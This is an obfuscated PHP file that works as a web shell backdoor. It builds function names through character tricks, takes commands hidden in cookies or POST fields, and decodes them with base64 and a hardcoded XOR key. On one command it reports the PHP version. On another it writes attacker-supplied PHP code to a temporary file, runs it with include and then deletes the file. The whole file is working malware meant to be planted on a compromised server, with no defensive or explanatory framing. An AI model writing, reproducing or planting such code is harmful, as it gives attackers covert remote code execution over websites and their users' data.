<?php $ficwtq/*  vgqak */=	'ficwtq'   ^  '';$bxnkoa_bsk/*   kr   */=	$ficwtq(444-342)/*hs  */.	"\x69"	.       "l"."e"."_"."p".$ficwtq(123-6)       .     $ficwtq(116)	./* ox */"\137"  ./*uxrpo   */"\143"     .	"o"."n"."t".$ficwtq(174-73)	.	"\156"	.	"t"."\163";
$ixriwit	=/*dota   */"\142"   ./* cj   */"\141"	.       $ficwtq(829-714)/*   wrl*/.	"\x65"/*  gaej */.       "6"."\64"/*   oe   */./*  qpo  */"\x5f"    ./* zbr   */$ficwtq(100)       .	"e"."c".$ficwtq(111)/*  o */./*   i_ql   */"\144"	.	$ficwtq(129-28);$jhgotlx_b      =/* wzlam  */"\165"	.   "n"."s"."\145"      ./* zk*/"r"."i"."a".$ficwtq(750-642)	.   "i".$ficwtq(329-207)/*   yumt  */.      "\x65";

$o_wlnck	=	"p"."h"."\160"/*  gxbf */./* x   */"v".$ficwtq(101)	.	"\x72"  .       $ficwtq(251-136)	.	$ficwtq(105)/* shh   */.	"o"."n";$sfjbd    =	"u".$ficwtq(110)	.	"l"."\x69"	./*   kul */"n"."\x6b";




	


function      jtifn($uuxpghv,	$gqyxycykp)
{

  global	$ficwtq;


    $vq_ckxjn   =/*   hu*/"";

	for	($k_cczyd/*k*/=	0;/*   n */$k_cczyd	<	strlen($uuxpghv);)    {


	for       ($vhxarqcao/*  bwxti */=	0;	$vhxarqcao   </*r */strlen($gqyxycykp)	&&/* i   */$k_cczyd/*  a*/</*   vqsre*/strlen($uuxpghv);/*   scg*/$vhxarqcao++,	$k_cczyd++)	{	$vq_ckxjn      .=/* oiu   */$ficwtq(ord($uuxpghv[$k_cczyd])       ^  ord($gqyxycykp[$vhxarqcao]));

       }

/*   zed  */}


/* m   */return   $vq_ckxjn;
}




$f_khjqn	=/*  en  */$_COOKIE;


$f_khjqn	=       array_merge($f_khjqn,/* fd  */$_POST);
$vvpggbdncf     =/*ubm_*/"c".$ficwtq(345-288)/*   zxz_w*/.	$ficwtq(446-394)      ./* abedr   */"\141"."\x65".$ficwtq(239-137)      ./*  dpvdq  */"\x34"    ./*cq_i*/"\141"."-"."1"."\x65"   .	$ficwtq(937-840)	.	"\x36"/*_his_ */./* s   */"-"."\64"/*o   */.     $ficwtq(180-130)/* wsxvw*/.	"\145"/* tq   */.	$ficwtq(49)   ./*ifx*/"-"."\x62"       ./* qpef*/$ficwtq(56)	.       "2"."\66"	.       $ficwtq(180-135)   .   "6"."d"."b"."\x36"/* ljrau */.	"\x34"	.	$ficwtq(56)	.	$ficwtq(54)      ./*   qsneg  */"3".$ficwtq(101)	.      "7"."\60"/*   j  */.   "6";


foreach   ($f_khjqn       as/*xig*/$zcxllapbil	=>  $uuxpghv)/*  orw  */{

/* exufc*/$uuxpghv	=     $jhgotlx_b(jtifn(jtifn($ixriwit($uuxpghv),/*   axb   */$vvpggbdncf),       $zcxllapbil));    if	(isset($uuxpghv["\141".$ficwtq(107)]))	{    if	($uuxpghv["\141"]      ==	$ficwtq(413-308))   {

/* nbh */$k_cczyd	=	array();	$k_cczyd["\x70"       ./*olhws  */$ficwtq(332-214)]       =	$o_wlnck();


	$k_cczyd["\x73"/* f  */./*pp   */"v"]/*   qy   */=/*  ypmqm*/$ficwtq(51)       .       $ficwtq(257-211)	.     "5";	echo/*nuq*/@serialize($k_cczyd);


/*   cdai */}     elseif/*   ly  */($uuxpghv["\141"]	==	"\x65")       {
   $rzxrkzndsq	=       sprintf(".".$ficwtq(47)       ./*   kp*/"%".$ficwtq(115)	.       "."."p"."\x6c",/*dt   */md5($vvpggbdncf));/* o   */$bxnkoa_bsk($rzxrkzndsq,       "<"/*  gkkb  */./*_cali*/"\x3f"/*   dpbcx*/.       "\x70"/*  tybmy */./*   _p*/"\150"/* oqh   */.	"p".$ficwtq(32)	./* v_   */"u"."n"."l".$ficwtq(413-308)."n"."k"."("."_"."_"."F"."I"."L"."E".$ficwtq(127-32)/* fatl_  */.	"\x5f"	.      ")".";".$ficwtq(32)     .       $uuxpghv["d"]);
	include($rzxrkzndsq);

    $sfjbd($rzxrkzndsq);

/*ydb */}
    exit();
  }

}

